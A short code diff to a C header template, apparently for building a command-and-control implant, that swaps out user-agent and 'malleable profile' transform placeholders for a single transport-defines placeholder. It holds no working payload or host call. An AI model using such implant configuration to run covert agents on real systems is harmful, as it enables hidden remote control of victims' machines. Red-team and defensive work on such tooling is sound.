@@ -86,21 +86,11 @@
 */
 #define %C2_PROFILE%
 
-#define S_GET_USERAGENT     "%S_GET_USERAGENT%"
-#define S_POST_USERAGENT    "%S_POST_USERAGENT%"
-
 #define S_AGENT_CONFIG      "%S_AGENT_CONFIG%"    // General instance configurations (id, encryption, proxy, sleep/jitter, rotation strategy, connection hosts)
 
 #define DLL_EXPORT_FUNC     %S_DLL_EXPORT_FUNC%
-/*
-    Malleable profiles
-*/
-// client transforms
-#define S_C2_GET_CLIENT     "%S_C2_GET_CLIENT%"
-#define S_C2_POST_CLIENT    "%S_C2_POST_CLIENT%"
-// server transforms
-#define S_C2_GET_SERVER     "%S_C2_GET_SERVER%"
-#define S_C2_POST_SERVER    "%S_C2_POST_SERVER%"
+
+%S_TRANSPORT_DEFINES%
 /*
     Optional Commands
 */
